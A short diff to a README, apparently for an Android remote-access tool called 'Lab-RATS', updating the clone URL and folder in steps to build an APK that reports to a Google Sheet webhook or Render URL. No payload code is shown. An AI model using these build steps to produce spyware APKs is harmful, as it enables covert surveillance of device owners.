@@ -239,8 +239,8 @@ function handleRequest(e) {
 *   Your **Google Sheet Webhook URL or Render URL**. *(previous sections above)*
 
 ### 2. Building the APK (on PC)
-1.  **Download the Repo**: `git clone https://github.com/K4N3CO/Lab-RATS.git`
-2.  **Navigate** to: `cd /Lab-RATS/apk-builder/`
+1.  **Download the Repo**: `git clone https://github.com/KAN30/Lab-RATS-v1.6.git`
+2.  **Navigate** to: `cd /Lab-RATS-v1.6/apk-builder/`
 3.  **Execute** the **Builder**:
     *   **Mac/Linux**: `chmod +x build.sh && ./build.sh`
     *   **Windows**: `build.bat`
